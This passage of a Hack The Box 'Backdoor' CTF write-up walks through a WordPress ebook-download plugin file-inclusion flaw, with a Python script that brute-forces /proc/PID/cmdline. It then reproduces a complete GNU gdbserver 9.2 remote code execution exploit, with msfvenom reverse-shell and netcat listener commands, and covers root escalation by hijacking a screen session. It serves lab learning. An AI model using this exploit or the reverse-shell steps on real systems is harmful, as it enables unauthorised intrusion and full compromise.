+<p>And if i continue to scrolling down we can see that on the PID 857 on the port 1337 is running a <strong><em>gdbserver</em></strong> in background, which is a debugger that it can be used to debug remotly on linux systems.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura59.png">
+</p>
+
+<p>Another way to do this attack and that i recommend is using <strong><em>Wfuzz</em></strong>. What we need to do is with the parameter <strong><em>-z</em></strong> specify the PID range and hidding the word “1w” using the flag <strong><em>–hw= 1</em></strong>, and wfuzz it going to report the PIDs that contain someting on file <strong><em>cmdline</em></strong> inside in that range that we specify.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura20.png">
+</p>
+
+<p>Once we find those PIDs what we can do with <strong><em>curl</em></strong> is output the content in a file, and here we can see the content of the file “cmdline” of the process 850 which is the screen process that we saw in burpsuite. If we want to avoid strange outputs use the flag <strong><em>-s</em></strong> which is the silence mode.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura21.png">
+</p>
+
+<p>Same thing with the process that are running the gdbserver which in this case is 851. Remember that in your case the PID can be different.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura20.png">
+</p>
+
+<p>Another way that we can do this attack is using python. So let’s create a simple python script to automate this task:</p>
+
+<p>First we are going to import the following libraries and then we are going to defined a function that when we are going to exit the program pressing the key <strong><em>ctrl+c</em></strong> it will appears the following message instead of python error messages.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/ctrlc.png">
+</p>
+
+<p>Now we are going to create a variable that contain thath vulnerable url. So in this case i am going to create another function called <strong><em>makerequest</em></strong> that inside it will contain a for loop specifying a range between 1 and 1000 which will gonna be the PIDs, and then we are going to create a variable inside of that for loop called <strong><em>url</em></strong> which we will going to specify the vulnerable url and the path “/route/pid/cmdlien” which pid is the sequential numbers that we sapecify on the loop.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura39.png">
+</p>
+
+<p>And if print the variable <strong><em>url</em></strong> and execute the script it will output the route “/proc/pid/cmdline” up to the range that we have specified, which in this case is from 1 to 1000. But the script is not useful is it? we need to add few more things to our scripts.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura40.png">
+</p>
+
+<p>Now we are going to import <strong><em>pdb</em></strong> library which allows to debug our code in python, and we are going to use this to apply a breakepoint.</p>
+
+<p>So if you asking what is a breakpoint? to understand that we need to know few concepts, first of all our program can have differents bugs, a bug is when we write a piece of code in our program that it doesn’t work correctly as we expected meaning that our program have some kind of fault or error, and this is called a <strong><em>program having a bug</em></strong>. And the process to find a bug and fixing it is called <strong><em>debugging</em></strong>. And the tool that we use to debugging is called <strong><em>debugger</em></strong>. And a <strong><em>breakepoint</em></strong> which essentially tells the debugger that we want to stop or pause and have a look at what’s going on in a certain line of our program, let’s say i want to debug from the line 1 to 50 but i don’t want to debug the rest of lines of the program, here is where we apply a breakpoint.</p>
+
+<p>But why we use a debugger? usually when the people are “debugging” what they’ll do is they’ll do someting called “print debugging”, so let’s say that we are never use a debugger, but you’ll prints things to your terminal or in your code to know what’s going on, let’s say that i want to check if a particular variable is working correctly and what i do is print that variable to know if it’s working what i expect to be. But as you soon your code get more complicated and there are bunch of lines of code where you might not know the values you actually want to look at, or you have a lot of files, there is a lot of different states that we want to examine, and it’s get really messy and long time printing things in to the console or in your code instead you can use debugger to do all that complicated and long time task in few seconds, basically it’s to know what’s going wrong in your code. more info <a href="https://www.youtube.com/watch?v=7qZBwhSlfOo">here</a></p>
+
+<p>So what we are doing here is set a breakpoint, in python to set a breakpoint with pdb library we use <strong><em>pdb.set_trace()</em></strong> to examine if our code and varibles are working as we expect. And on the variable <strong><em>r</em></strong> we are sending a GET request to the vulnerable url.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/pdb.png">
+</p>
+
+<p>Now if we execute the script we will be in the debugger mode. and if list (which will show the current execution point) it’s indicate with arrows the line 18 and this is because since it has gone through the first iteration and it returns to execute the loop again already passed through the breakpoint.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/find.png">
+</p>
+
+<p>If we list the attributes of variable <strong><em>r</em></strong>, we can see that there is a “command” that we can use which is <strong><em>content</em></strong>, which allows us to see the content of that variable. and can we see that it shows us the content of the cmdline file of PID 1. So that variable is working as we expect. and if we check the value of that content we can see that is 120.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/content.png">
+</p>
+
+<p>So in the function <strong><em>makerequest</em></strong> where we have defined the for loop we are going to add the <strong><em>print(len(r.content))</em></strong> so that it continuously lists the length of the response (http responses).</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/forloop.png">
+</p>
+
+<p>Now are going to execute the script, and we can see that the first value is 120.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/progress.png">
+</p>
+
+<p>And we see that some values are duplicated and all the answers are 82. With this we can think that the values of the length that are greater than 82 can return the content of cmdline. Because when we have executed the script the first length was 120 and previously we have seen that it has content in a cmdline file.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/progress2.png">
+</p>
+
+<p>Now inside in the function makerequest i we are going to create a progress bar that it defined on the variable <strong><em>p1</em></strong> and then we want to update that progress bar indicated with <strong><em>p1.status</em></strong>, and we add another <strong><em>p1.status</em></strong> to update that progress bar with values and we do that specifying with <strong><em>%s</em></strong> to replace it with num variable <strong><em>(“/proc/%s/cmdline % str(num)”)</em></strong>. And lastly we create a if statement so that the values of the length that are greater than 82 that have content it report us on the console, and we do that using the <strong><em>log.info</em></strong> which is from the pwn library to report the path that have tried and the length.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/if.png">
+</p>
+
+<p>And now if we execute the script we can the progress bar and it already reports the first length that 120 has content in the cmdline, which is PID 1 as we have seen previously. And now we need to wait for the others that have content in cmdline.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/execute.png">
+</p>
+
+<p>And we see that it output the process that is executing the gdbserver and screen as we have already seen in burpsuite and with wfuzz.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura48.png">
+</p>
+
+<p>Here is the script if you want to copy:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>
+
+<span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] Exit...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">#ctrl+c
+</span><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
+
+<span class="c1"># Global variable
+</span><span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="</span>
+
+<span class="k">def</span> <span class="nf">makerequest</span><span class="p">():</span>
+     <span class="c1"># loop for check PID
+</span>
+     <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Brute Force attack"</span><span class="p">)</span>
+     <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Starting brute force attack"</span><span class="p">)</span>
+
+     <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+     <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
+
+         <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Trying with PATH /proc/</span><span class="si">%</span><span class="s">s/cmdline"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+
+         <span class="n">url</span> <span class="o">=</span> <span class="n">main_url</span> <span class="o">+</span> <span class="s">"/proc/"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/cmdline"</span>
+
+         <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">82</span><span class="p">:</span>
+             <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------------------------------"</span><span class="p">)</span>
+             <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PATH: /proc/</span><span class="si">%</span><span class="s">s/cmdline"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+             <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Total length: </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>
+             <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+             <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------------------------------"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+
+    <span class="n">makerequest</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Using searchsploit, I wanted to find out if there was any gdbserver exploit, but fortunately I didn’t find anything.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura31.png">
+</p>
+
+<p>Then searching in google i found an gdbserver exploit that allows to RCE.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura32.png">
+</p>
+
+<p>So this is the exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
+# Date: 2021-11-21
+# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
+# Vendor Homepage: https://www.gnu.org/software/gdb/
+# Software Link: https://www.gnu.org/software/gdb/download/
+# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
+# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)
+</span>
+<span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">help</span> <span class="o">=</span> <span class="n">f</span><span class="s">'''
+Usage: python3 {sys.argv[0]} &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;
+
+Example:
+- Victim's gdbserver   -&gt;  10.10.10.200:1337
+- Attacker's listener  -&gt;  10.10.10.100:4444
+
+1. Generate shellcode with msfvenom:
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
+
+2. Listen with Netcat:
+$ nc -nlvp 4444
+
+3. Run the exploit:
+$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
+'''</span>
+
+
+<span class="k">def</span> <span class="nf">checksum</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span>
+    <span class="k">return</span> <span class="n">f</span><span class="s">'{res:2x}'</span>
+
+
+<span class="k">def</span> <span class="nf">ack</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">'+'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s">'${s}#{checksum(s)}'</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">ack</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'qSupported:multiprocess+;qRelocInsn+;qvCont+;'</span><span class="p">)</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'!'</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'vCont;s'</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">';'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">arch</span><span class="p">,</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[!] ERROR: Unexpected response. Try again later'</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">'10'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Found x64 arch'</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">[:</span><span class="n">pc</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">'0*'</span><span class="p">)])</span>
+        <span class="n">pc</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">+</span> <span class="n">addr</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">'08'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Found x86 arch'</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">+</span> <span class="n">addr</span>
+
+    <span class="n">hex_length</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">'[+] Sending payload'</span><span class="p">)</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">f</span><span class="s">'M{addr},{hex_length}:{payload}'</span><span class="p">)</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'vCont;c'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">help</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="nb">hex</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'[!] ERROR: File {file} not found'</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Connected to target. Preparing exploit'</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[*] Pwned!! Check your listener'</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Inside the script it tells us the instructions that we must follow, first it tells us to generate a payload with <strong><em>msfvenom</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura25.png">
+</p>
+
+<p>Then with netcat we ara going to listen on the port 443 and then execute the exploit specifying the IP address of the target machine and the payload that we generate with msfvenom, And with that we gain access to the target machine and we are logged in as a user “user”.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura26.png">
+</p>
+
+<p>And now as we always do we are going to import a tty.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura35.png">
+</p>
+
+<p>And we are going to export two env variables, one is <strong><em>TERM=xterm</em></strong> and the another <strong><em>SHELL=bash</em></strong>. And with that we can use command like “clear”, we do ctrl+c, ctrl+l, move comfortably on the reverse shell as if we were in a connection through ssh.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura29.png">
+</p>
+
+<p>Remember that we can export a pseudo console with python.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura38.png">
+</p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>And if we access with the home directory with the user “user” we can view the first flag which is <strong><em>user.txt</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura39.png">
+</p>
+
+<p>So we don’t have a permission to access to the root directory, we can’t list what sudo permissions we have because it requiere password and there is no cron jobs that we can take advantage to escalate privileges.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura31.png">
+</p>
+
+<p>So before we saw that there is a screening process running on the background, let’s check if the screen command have SUID permissions, and as you can see it is.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura32.png">
+</p>
+
+<p>So some versions of screen is vulnerable to PrivEsc.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura33.png">
+</p>
+
+<p>But in our case we can’t use those exploits because it’s different and more recent version.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura34.png">
+</p>
+
+<p>If we look the processes on the system and we search for screen, we can see that there is a saved session with the root user and before we see that screen is SUID.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura35.png">
+</p>
+
+<p>So we just need to access with that session that is saved in background, to do that we just use the flag <strong><em>-x</em></strong> and specify the session. This is similar when we use tmux.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura36.png">
+</p>
+
+<p>And we are logged in with root user and we can view the last flag which is <strong><em>root.txt</em></strong>, and with that we pwned the machine. So the PrivEsc in this case it was very easy.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura37.png">
+</p>
+
+<p>Before we obtain database credentials on the <strong><em>wp-config.php</em></strong> file, we can try to use them to access on the database in the target machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura38.png">
+</p>
+
+<p>And we access on the myslq database, and here we can see the databases that are created.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura43.png">
+</p>
+
+<p>We can access the wordpress database and here we can enter the <strong><em>wp-users</em></strong> table to see the users and passwords.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura44.png">
+</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack the box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">lfi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wordpress" class="page__taxonomy-item" rel="tag">wordpress</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#web-pentesting" class="page__taxonomy-item" rel="tag">web pentesting</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-11-30T00:00:00-05:00">November 30, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/tmux-short/" class="pagination--pager" title="Tmux Shortcuts
+">Previous</a>
+    
+    
+      <a href="/htb-pikaboo/" class="pagination--pager" title="HTB - Pikaboo
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 bynafrez08.io</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
